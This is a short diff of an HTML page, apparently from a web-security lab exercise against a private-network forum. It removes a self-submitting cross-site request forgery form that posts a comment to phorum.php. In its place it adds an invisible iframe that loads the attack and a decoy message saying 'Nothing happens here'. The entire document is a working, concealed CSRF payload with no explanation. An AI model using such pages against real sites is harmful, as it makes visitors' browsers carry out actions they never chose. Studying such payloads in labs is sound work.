@@ -3,14 +3,7 @@
 <head>
 </head>
 <body>
-    <form id="csrf" method="post" action="http://192.168.28.119/phorum.php">
-        <input type="hidden" value="from IFrame not visible" name="komentarz"></input>
-        <input type="Submit" value="Skomentuj" />
-    </form>
-
-    <script>
-        var csrf = document.getElementById("csrf");
-        csrf.submit();
-    </script>
+    <iframe style="opacity:0;" src="frame.html"></iframe>
+    Tu nic się nie dzieje.
 </body>
 </html>
